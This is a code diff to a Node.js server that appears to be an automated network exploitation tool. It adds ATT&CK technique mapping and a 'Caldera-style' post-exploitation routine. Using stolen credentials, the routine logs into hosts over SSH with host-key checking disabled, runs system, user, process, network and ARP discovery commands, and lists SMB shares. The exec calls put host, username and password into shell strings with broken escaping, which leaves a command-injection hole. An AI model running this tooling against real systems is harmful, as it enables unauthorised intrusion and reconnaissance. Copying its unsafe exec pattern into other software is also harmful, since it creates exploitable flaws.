@@ -287,6 +287,32 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Get MITRE ATT&CK technique library
+    if (urlPath === '/api/attack-techniques' && method === 'GET') {
+        res.writeHead(200);
+        res.end(JSON.stringify(ATTACK_TECHNIQUES));
+        return;
+    }
+
+    // Map exploit method to ATT&CK techniques
+    if (urlPath === '/api/attack-mapping' && method === 'POST') {
+        const data = JSON.parse(body);
+        const mapping = mapExploitToATTACK(data.method || '');
+        res.writeHead(200);
+        res.end(JSON.stringify(mapping));
+        return;
+    }
+
+    // Post-exploitation discovery (Caldera-style abilities)
+    if (urlPath === '/api/post-exploit-discovery' && method === 'POST') {
+        const data = JSON.parse(body);
+        executeDiscoveryAbilities(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
     // Detect installed exploitation tools
     if (urlPath === '/api/detect-tools' && method === 'GET') {
         detectInstalledTools((tools) => {
@@ -1266,6 +1292,201 @@ function hydraBrute(host, port, service, credentials, callback) {
     });
 }
 
+// ===== MITRE ATT&CK TECHNIQUE LIBRARY (Inspired by MITRE Caldera v5) =====
+const ATTACK_TECHNIQUES = {
+    reconnaissance: [
+        { id: 'T1595', name: 'Active Scanning', subtechniques: ['T1595.001', 'T1595.002', 'T1595.003'] },
+        { id: 'T1592', name: 'Gather Victim Host Information' },
+        { id: 'T1590', name: 'Gather Victim Network Information' },
+        { id: 'T1589', name: 'Gather Victim Identity Information' }
+    ],
+    discovery: [
+        { id: 'T1046', name: 'Network Service Discovery' },
+        { id: 'T1135', name: 'Network Share Discovery' },
+        { id: 'T1040', name: 'Network Sniffing' },
+        { id: 'T1018', name: 'Remote System Discovery' },
+        { id: 'T1082', name: 'System Information Discovery' },
+        { id: 'T1016', name: 'System Network Configuration Discovery' },
+        { id: 'T1049', name: 'System Network Connections Discovery' },
+        { id: 'T1033', name: 'System Owner/User Discovery' },
+        { id: 'T1007', name: 'System Service Discovery' },
+        { id: 'T1124', name: 'System Time Discovery' },
+        { id: 'T1069', name: 'Permission Groups Discovery' },
+        { id: 'T1057', name: 'Process Discovery' },
+        { id: 'T1012', name: 'Query Registry' },
+        { id: 'T1518', name: 'Software Discovery' }
+    ],
+    credential_access: [
+        { id: 'T1110', name: 'Brute Force', subtechniques: ['T1110.001', 'T1110.002', 'T1110.003', 'T1110.004'] },
+        { id: 'T1003', name: 'OS Credential Dumping' },
+        { id: 'T1552', name: 'Unsecured Credentials' },
+        { id: 'T1078', name: 'Valid Accounts' }
+    ],
+    lateral_movement: [
+        { id: 'T1021', name: 'Remote Services', subtechniques: ['T1021.001', 'T1021.002', 'T1021.004', 'T1021.006'] },
+        { id: 'T1570', name: 'Lateral Tool Transfer' },
+        { id: 'T1072', name: 'Software Deployment Tools' }
+    ],
+    execution: [
+        { id: 'T1059', name: 'Command and Scripting Interpreter' },
+        { id: 'T1047', name: 'Windows Management Instrumentation' },
+        { id: 'T1569', name: 'System Services' }
+    ],
+    collection: [
+        { id: 'T1005', name: 'Data from Local System' },
+        { id: 'T1039', name: 'Data from Network Shared Drive' },
+        { id: 'T1074', name: 'Data Staged' }
+    ],
+    exfiltration: [
+        { id: 'T1041', name: 'Exfiltration Over C2 Channel' },
+        { id: 'T1048', name: 'Exfiltration Over Alternative Protocol' }
+    ]
+};
+
+// Caldera-style ability execution: system discovery techniques
+function executeDiscoveryAbilities(host, method, credentials, callback) {
+    const isWin = process.platform === 'win32';
+    const results = { host, techniques: [], systemInfo: {} };
+    let pending = 0;
+
+    function done() {
+        pending--;
+        if (pending <= 0) callback(results);
+    }
+
+    // T1082: System Information Discovery
+    pending++;
+    if (method === 'SSH' && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "uname -a && cat /etc/os-release 2>/dev/null && free -h 2>/dev/null && df -h 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+            if (stdout && !stdout.includes('Permission denied')) {
+                results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: true, data: stdout.substring(0, 500) });
+                results.systemInfo.os = stdout;
+            }
+            done();
+        });
+    } else {
+        results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: false });
+        done();
+    }
+
+    // T1016: System Network Configuration Discovery
+    pending++;
+    if (method === 'SSH' && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "ip addr 2>/dev/null || ifconfig 2>/dev/null && ip route 2>/dev/null || route -n 2>/dev/null && cat /etc/resolv.conf 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+            if (stdout && !stdout.includes('Permission denied')) {
+                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: true, data: stdout.substring(0, 500) });
+                results.systemInfo.network = stdout;
+            } else {
+                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: false });
+            }
+            done();
+        });
+    } else {
+        results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: false });
+        done();
+    }
+
+    // T1033: System Owner/User Discovery
+    pending++;
+    if (method === 'SSH' && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "whoami && id && w && last -5 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+            if (stdout && !stdout.includes('Permission denied')) {
+                results.techniques.push({ id: 'T1033', name: 'System Owner/User Discovery', success: true, data: stdout.substring(0, 500) });
+                results.systemInfo.users = stdout;
+            }
+            done();
+        });
+    } else {
+        results.techniques.push({ id: 'T1033', name: 'System Owner/User Discovery', success: false });
+        done();
+    }
+
+    // T1057: Process Discovery
+    pending++;
+    if (method === 'SSH' && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "ps aux --sort=-%mem 2>/dev/null | head -20" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+            if (stdout && !stdout.includes('Permission denied')) {
+                results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: true, data: stdout.substring(0, 500) });
+                results.systemInfo.processes = stdout;
+            }
+            done();
+        });
+    } else {
+        results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: false });
+        done();
+    }
+
+    // T1018: Remote System Discovery (scan neighbors from exploited host)
+    pending++;
+    if (method === 'SSH' && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "arp -a 2>/dev/null && cat /proc/net/arp 2>/dev/null" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+            if (stdout && !stdout.includes('Permission denied')) {
+                results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: true, data: stdout.substring(0, 500) });
+                results.systemInfo.neighbors = stdout;
+            }
+            done();
+        });
+    } else {
+        results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: false });
+        done();
+    }
+
+    // T1135: Network Share Discovery
+    pending++;
+    if (method && method.includes('SMB') && credentials) {
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        if (isWin) {
+            exec(`net view \\\\${host} 2>&1`, { timeout: 10000 }, (err, stdout) => {
+                results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success: !err, data: (stdout || '').substring(0, 500) });
+                done();
+            });
+        } else {
+            exec(`smbclient -L //${host} -U '${credentials.username}%${escapedPass}' -t 5 2>&1`, { timeout: 15000 }, (err, stdout) => {
+                const success = stdout && (stdout.includes('Sharename') || stdout.includes('Disk'));
+                results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success, data: (stdout || '').substring(0, 500) });
+                done();
+            });
+        }
+    } else {
+        results.techniques.push({ id: 'T1135', name: 'Network Share Discovery', success: false });
+        done();
+    }
+}
+
+// Map our exploit methods to ATT&CK technique IDs
+function mapExploitToATTACK(method) {
+    const mapping = {
+        'SSH': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021.004', 'T1110.001'] },
+        'SMB': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021.002', 'T1110.001'] },
+        'FTP': { tactics: ['credential_access', 'lateral_movement'], techniques: ['T1110.001', 'T1078'] },
+        'Telnet': { tactics: ['lateral_movement', 'credential_access'], techniques: ['T1021', 'T1110.001'] },
+        'Redis-NoAuth': { tactics: ['credential_access'], techniques: ['T1552', 'T1078'] },
+        'MongoDB-NoAuth': { tactics: ['credential_access', 'collection'], techniques: ['T1552', 'T1005'] },
+        'VNC-NoAuth': { tactics: ['lateral_movement'], techniques: ['T1021.005'] },
+        'MySQL': { tactics: ['credential_access'], techniques: ['T1110.001'] },
+        'PostgreSQL': { tactics: ['credential_access'], techniques: ['T1110.001'] },
+        'NetExec-SMB': { tactics: ['lateral_movement', 'credential_access', 'execution'], techniques: ['T1021.002', 'T1110', 'T1047'] },
+        'NetExec-SSH': { tactics: ['lateral_movement'], techniques: ['T1021.004'] },
+        'NetExec-WINRM': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.006', 'T1059'] },
+        'NetExec-RDP': { tactics: ['lateral_movement'], techniques: ['T1021.001'] },
+        'NetExec-MSSQL': { tactics: ['credential_access', 'execution'], techniques: ['T1110', 'T1059'] },
+        'Impacket-psexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1569'] },
+        'Impacket-smbexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1059'] },
+        'Impacket-wmiexec': { tactics: ['lateral_movement', 'execution'], techniques: ['T1021.002', 'T1047'] },
+        'Impacket-secretsdump': { tactics: ['credential_access'], techniques: ['T1003'] },
+        'Hydra-ssh': { tactics: ['credential_access'], techniques: ['T1110.001'] },
+        'Hydra-ftp': { tactics: ['credential_access'], techniques: ['T1110.001'] },
+        'Hydra-smb': { tactics: ['credential_access'], techniques: ['T1110.001'] },
+        'Nmap-VulnScan': { tactics: ['reconnaissance'], techniques: ['T1595.002'] }
+    };
+    return mapping[method] || { tactics: ['unknown'], techniques: [] };
+}
+
 // ===== ENHANCED AUTO-EXPLOIT WITH ALL INTEGRATED TOOLS =====
 function detectInstalledTools(callback) {
     const tools = ['nxc', 'netexec', 'crackmapexec', 'nmap', 'hydra',
@@ -1599,9 +1820,25 @@ function autoExploit(host, openPorts, userCredentials, callback) {
             }
         }
 
+        let finished = false;
         function finishExploit() {
+            if (finished) return;
+            finished = true;
             const success = results.find(r => r.success);
             if (success && !bestResult) bestResult = success;
+
+            // Map all results to ATT&CK techniques
+            const attackMapping = bestResult ? mapExploitToATTACK(bestResult.method) : { tactics: [], techniques: [] };
+            const allTechniques = results.map(r => ({
+                method: r.method,
+                success: r.success,
+                attack: mapExploitToATTACK(r.method || '')
+            }));
+
+            // Always include scanning technique
+            attackMapping.techniques.push('T1046'); // Network Service Discovery
+            attackMapping.techniques.push('T1595.002'); // Vulnerability Scanning
+
             callback({
                 success: !!bestResult,
                 method: bestResult ? bestResult.method : 'None',
@@ -1609,6 +1846,8 @@ function autoExploit(host, openPorts, userCredentials, callback) {
                 bestResult: bestResult || null,
                 allResults: results,
                 toolsUsed: Object.keys(tools),
+                attackMapping,
+                allTechniques,
                 info: bestResult ?
                     `Exploited via ${bestResult.method} (${bestResult.username || 'no-auth'})${bestResult.admin ? ' [ADMIN]' : ''}` :
                     `All ${results.length} exploitation attempts failed`,
